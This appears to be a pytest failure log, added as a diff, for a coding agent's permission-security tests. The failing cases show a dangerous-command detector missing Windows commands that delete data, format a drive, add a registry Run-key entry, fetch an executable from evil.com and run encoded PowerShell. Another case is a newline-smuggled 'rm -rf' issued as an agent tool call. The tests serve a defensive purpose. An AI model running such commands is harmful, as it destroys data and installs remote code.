@@ -1,0 +1,241 @@
+........................................................................ [  9%]
+........................................................................ [ 18%]
+........................................................................ [ 28%]
+........................................................................ [ 37%]
+........................................................................ [ 47%]
+.................FFFFFFF......F...........F............................. [ 56%]
+........................................................s............... [ 66%]
+........................................................................ [ 75%]
+........................................................................ [ 85%]
+........................................................................ [ 94%]
+.........................................                                [100%]
+=================================== FAILURES ===================================
+_ TestWindowsDangerousCommands.test_windows_patterns_hit[rd /s /q C:\\project] _
+
+self = <test_permission_security.TestWindowsDangerousCommands object at 0x7f692642da00>
+command = 'rd /s /q C:\\project'
+
+    @pytest.mark.parametrize("command", [
+        "rd /s /q C:\\project",
+        "del /f /s /q C:\\project\\*",
+        "format D:",
+        "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v evil /d calc",
+        "certutil -urlcache -f http://evil.com/x.exe x.exe",
+        "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
+        "Remove-Item -Recurse -Force C:\\ -ErrorAction SilentlyContinue",
+    ])
+    def test_windows_patterns_hit(self, command: str):
+        detector = DangerousCommandDetector()
+        hit, reason = detector.detect(command)
+>       assert hit, f"{command} must be denied: {reason}"
+E       AssertionError: rd /s /q C:\project must be denied: 
+E       assert False
+
+tests/test_permission_security.py:897: AssertionError
+_ TestWindowsDangerousCommands.test_windows_patterns_hit[del /f /s /q C:\\project\\*] _
+
+self = <test_permission_security.TestWindowsDangerousCommands object at 0x7f692642da60>
+command = 'del /f /s /q C:\\project\\*'
+
+    @pytest.mark.parametrize("command", [
+        "rd /s /q C:\\project",
+        "del /f /s /q C:\\project\\*",
+        "format D:",
+        "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v evil /d calc",
+        "certutil -urlcache -f http://evil.com/x.exe x.exe",
+        "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
+        "Remove-Item -Recurse -Force C:\\ -ErrorAction SilentlyContinue",
+    ])
+    def test_windows_patterns_hit(self, command: str):
+        detector = DangerousCommandDetector()
+        hit, reason = detector.detect(command)
+>       assert hit, f"{command} must be denied: {reason}"
+E       AssertionError: del /f /s /q C:\project\* must be denied: 
+E       assert False
+
+tests/test_permission_security.py:897: AssertionError
+______ TestWindowsDangerousCommands.test_windows_patterns_hit[format D:] _______
+
+self = <test_permission_security.TestWindowsDangerousCommands object at 0x7f692642d9a0>
+command = 'format D:'
+
+    @pytest.mark.parametrize("command", [
+        "rd /s /q C:\\project",
+        "del /f /s /q C:\\project\\*",
+        "format D:",
+        "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v evil /d calc",
+        "certutil -urlcache -f http://evil.com/x.exe x.exe",
+        "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
+        "Remove-Item -Recurse -Force C:\\ -ErrorAction SilentlyContinue",
+    ])
+    def test_windows_patterns_hit(self, command: str):
+        detector = DangerousCommandDetector()
+        hit, reason = detector.detect(command)
+>       assert hit, f"{command} must be denied: {reason}"
+E       AssertionError: format D: must be denied: 
+E       assert False
+
+tests/test_permission_security.py:897: AssertionError
+_ TestWindowsDangerousCommands.test_windows_patterns_hit[reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v evil /d calc] _
+
+self = <test_permission_security.TestWindowsDangerousCommands object at 0x7f692642d8b0>
+command = 'reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v evil /d calc'
+
+    @pytest.mark.parametrize("command", [
+        "rd /s /q C:\\project",
+        "del /f /s /q C:\\project\\*",
+        "format D:",
+        "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v evil /d calc",
+        "certutil -urlcache -f http://evil.com/x.exe x.exe",
+        "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
+        "Remove-Item -Recurse -Force C:\\ -ErrorAction SilentlyContinue",
+    ])
+    def test_windows_patterns_hit(self, command: str):
+        detector = DangerousCommandDetector()
+        hit, reason = detector.detect(command)
+>       assert hit, f"{command} must be denied: {reason}"
+E       AssertionError: reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v evil /d calc must be denied: 
+E       assert False
+
+tests/test_permission_security.py:897: AssertionError
+_ TestWindowsDangerousCommands.test_windows_patterns_hit[certutil -urlcache -f http://evil.com/x.exe x.exe] _
+
+self = <test_permission_security.TestWindowsDangerousCommands object at 0x7f692642d7f0>
+command = 'certutil -urlcache -f http://evil.com/x.exe x.exe'
+
+    @pytest.mark.parametrize("command", [
+        "rd /s /q C:\\project",
+        "del /f /s /q C:\\project\\*",
+        "format D:",
+        "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v evil /d calc",
+        "certutil -urlcache -f http://evil.com/x.exe x.exe",
+        "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
+        "Remove-Item -Recurse -Force C:\\ -ErrorAction SilentlyContinue",
+    ])
+    def test_windows_patterns_hit(self, command: str):
+        detector = DangerousCommandDetector()
+        hit, reason = detector.detect(command)
+>       assert hit, f"{command} must be denied: {reason}"
+E       AssertionError: certutil -urlcache -f http://evil.com/x.exe x.exe must be denied: 
+E       assert False
+
+tests/test_permission_security.py:897: AssertionError
+_ TestWindowsDangerousCommands.test_windows_patterns_hit[powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA] _
+
+self = <test_permission_security.TestWindowsDangerousCommands object at 0x7f692642cc50>
+command = 'powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA'
+
+    @pytest.mark.parametrize("command", [
+        "rd /s /q C:\\project",
+        "del /f /s /q C:\\project\\*",
+        "format D:",
+        "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v evil /d calc",
+        "certutil -urlcache -f http://evil.com/x.exe x.exe",
+        "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
+        "Remove-Item -Recurse -Force C:\\ -ErrorAction SilentlyContinue",
+    ])
+    def test_windows_patterns_hit(self, command: str):
+        detector = DangerousCommandDetector()
+        hit, reason = detector.detect(command)
+>       assert hit, f"{command} must be denied: {reason}"
+E       AssertionError: powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA must be denied: 
+E       assert False
+
+tests/test_permission_security.py:897: AssertionError
+_ TestWindowsDangerousCommands.test_windows_patterns_hit[Remove-Item -Recurse -Force C:\\ -ErrorAction SilentlyContinue] _
+
+self = <test_permission_security.TestWindowsDangerousCommands object at 0x7f692642cb60>
+command = 'Remove-Item -Recurse -Force C:\\ -ErrorAction SilentlyContinue'
+
+    @pytest.mark.parametrize("command", [
+        "rd /s /q C:\\project",
+        "del /f /s /q C:\\project\\*",
+        "format D:",
+        "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v evil /d calc",
+        "certutil -urlcache -f http://evil.com/x.exe x.exe",
+        "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
+        "Remove-Item -Recurse -Force C:\\ -ErrorAction SilentlyContinue",
+    ])
+    def test_windows_patterns_hit(self, command: str):
+        detector = DangerousCommandDetector()
+        hit, reason = detector.detect(command)
+>       assert hit, f"{command} must be denied: {reason}"
+E       AssertionError: Remove-Item -Recurse -Force C:\ -ErrorAction SilentlyContinue must be denied: 
+E       assert False
+
+tests/test_permission_security.py:897: AssertionError
+____________ TestFileToolWindowsCompat.test_read_and_edit_gbk_file _____________
+
+self = <test_permission_security.TestFileToolWindowsCompat object at 0x7f6926606cc0>
+tmp_path = PosixPath('/tmp/pytest-of-runner/pytest-0/test_read_and_edit_gbk_file0')
+
+    def test_read_and_edit_gbk_file(self, tmp_path):
+        """GBK 编码文件可读可编辑（严格 utf-8 解码会 UnicodeDecodeError）。"""
+        import asyncio
+    
+        from mewcode.tools.edit_file import EditFile
+        from mewcode.tools.edit_file import Params as EditParams
+        from mewcode.tools.read_file import Params as ReadParams
+        from mewcode.tools.read_file import ReadFile
+    
+        f = tmp_path / "gbk.txt"
+        f.write_bytes("中文内容第一行\n第二行\n".encode("gbk"))
+    
+        r = asyncio.run(ReadFile().execute(ReadParams.model_validate({
+            "file_path": str(f),
+        })))
+        assert not r.is_error
+>       assert "中文内容第一行" in r.output
+E       AssertionError: assert '中文内容第一行' in '1\t�������ݵ�һ��\n2\t�ڶ���'
+E        +  where '1\t�������ݵ�һ��\n2\t�ڶ���' = ToolResult(output='1\t�������ݵ�һ��\n2\t�ڶ���', is_error=False).output
+
+tests/test_permission_security.py:953: AssertionError
+__ TestEndToEndBypassRedLines.test_shell_injection_via_newline_never_executes __
+
+self = <test_permission_security.TestEndToEndBypassRedLines object at 0x7f69263d2300>
+tmp_path = PosixPath('/tmp/pytest-of-runner/pytest-0/test_shell_injection_via_newli0')
+
+        def test_shell_injection_via_newline_never_executes(
+            self, tmp_path: Path
+        ) -> None:
+            """§3.3：`echo hi
+    rm -rf ...` 必须触发人工确认且默认拒绝后不执行。"""
+            canary = tmp_path / "canary.txt"
+            canary.write_text("still here", encoding="utf-8")
+    
+            cmd = "echo hi\nrm -rf " + str(tmp_path).replace("\\", "/")
+            client = MockLLMClient([
+                [
+                    ToolCallComplete("t1", "Bash", {"command": cmd}),
+                    StreamEnd("end_turn", input_tokens=10, output_tokens=20),
+                ],
+                [TextDelta("done."), StreamEnd("end_turn", input_tokens=5, output_tokens=5)],
+            ])
+            agent = _make_agent(tmp_path, client)
+            results, requests = self._collect(agent, _conv("echo then rm"))
+    
+>           assert requests, "newline-injected command must require confirmation"
+E           AssertionError: newline-injected command must require confirmation
+E           assert []
+
+tests/test_permission_security.py:1265: AssertionError
+=========================== short test summary info ============================
+FAILED tests/test_permission_security.py::TestWindowsDangerousCommands::test_windows_patterns_hit[rd /s /q C:\\project] - AssertionError: rd /s /q C:\project must be denied: 
+assert False
+FAILED tests/test_permission_security.py::TestWindowsDangerousCommands::test_windows_patterns_hit[del /f /s /q C:\\project\\*] - AssertionError: del /f /s /q C:\project\* must be denied: 
+assert False
+FAILED tests/test_permission_security.py::TestWindowsDangerousCommands::test_windows_patterns_hit[format D:] - AssertionError: format D: must be denied: 
+assert False
+FAILED tests/test_permission_security.py::TestWindowsDangerousCommands::test_windows_patterns_hit[reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v evil /d calc] - AssertionError: reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v evil /d calc must be denied: 
+assert False
+FAILED tests/test_permission_security.py::TestWindowsDangerousCommands::test_windows_patterns_hit[certutil -urlcache -f http://evil.com/x.exe x.exe] - AssertionError: certutil -urlcache -f http://evil.com/x.exe x.exe must be denied: 
+assert False
+FAILED tests/test_permission_security.py::TestWindowsDangerousCommands::test_windows_patterns_hit[powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA] - AssertionError: powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA must be denied: 
+assert False
+FAILED tests/test_permission_security.py::TestWindowsDangerousCommands::test_windows_patterns_hit[Remove-Item -Recurse -Force C:\\ -ErrorAction SilentlyContinue] - AssertionError: Remove-Item -Recurse -Force C:\ -ErrorAction SilentlyContinue must be denied: 
+assert False
+FAILED tests/test_permission_security.py::TestFileToolWindowsCompat::test_read_and_edit_gbk_file - AssertionError: assert '中文内容第一行' in '1\t�������ݵ�һ��\n2\t�ڶ���'
+ +  where '1\t�������ݵ�һ��\n2\t�ڶ���' = ToolResult(output='1\t�������ݵ�һ��\n2\t�ڶ���', is_error=False).output
+FAILED tests/test_permission_security.py::TestEndToEndBypassRedLines::test_shell_injection_via_newline_never_executes - AssertionError: newline-injected command must require confirmation
+assert []
+9 failed, 751 passed, 1 skipped in 18.18s
